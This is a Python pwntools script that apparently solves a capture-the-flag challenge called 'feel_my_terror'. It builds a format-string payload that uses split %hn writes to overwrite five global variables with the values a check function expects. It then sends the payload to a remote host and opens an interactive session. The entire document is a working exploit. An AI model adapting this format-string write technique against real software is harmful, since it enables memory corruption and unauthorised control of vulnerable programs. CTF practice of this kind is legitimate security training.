from pwn import *


context.binary = elf = ELF('./feel_my_terror')
context.log_level = 'info'

HOST = '154.57.164.77'
PORT = 30099


def start():
    return remote(HOST, PORT) 


def build_payload():
    # Values expected by check_db()
    targets = {
        elf.symbols['arg1']: 0xDEADBEEF,
        elf.symbols['arg2']: 0x1337C0DE,
        elf.symbols['arg3']: 0xF337BABE,
        elf.symbols['arg4']: 0x1337F337,
        elf.symbols['arg5']: 0xFADEEEED,
    }

    # Each dword is written as two shorts to avoid 32-bit padding of ~300M chars
    writes = []  # (value, address, modifier)
    for addr, val in targets.items():
        writes.append((val & 0xFFFF, addr, 'hn'))           # low 2 bytes
        writes.append(((val >> 16) & 0xFFFF, addr + 2, 'hn'))  # high 2 bytes

    writes.sort(key=lambda x: x[0])  # monotonically increasing print count

    base_offset = 6  # found via `%p` probing; %6$p points into our input buffer
    target_fmt_len = 112  # keep total payload under 0xC5 (197) bytes
    addr_start_idx = base_offset + (target_fmt_len // 8)  # first address = %20$

    fmt = ""
    printed = 0
    for i, (val, addr, mod) in enumerate(writes):
        pad = val - printed
        if pad < 0:
            pad += 0x10000  # wrap for %hn
        if pad:
            fmt += f"%{pad}c"
            printed += pad
        fmt += f"%{addr_start_idx + i}${mod}"

    fmt += "A" * max(0, target_fmt_len - len(fmt))  # align so addresses sit at %20$

    payload = fmt.encode()
    for _, addr, _ in writes:
        payload += p64(addr)

    log.info(f"payload length: {len(payload)} (<= 197 bytes budget)")
    return payload


def solve():
    io = start()
    payload = build_payload()

    io.recvuntil(b'> ')
    io.send(payload)
    io.interactive()


if __name__ == '__main__':
    solve()
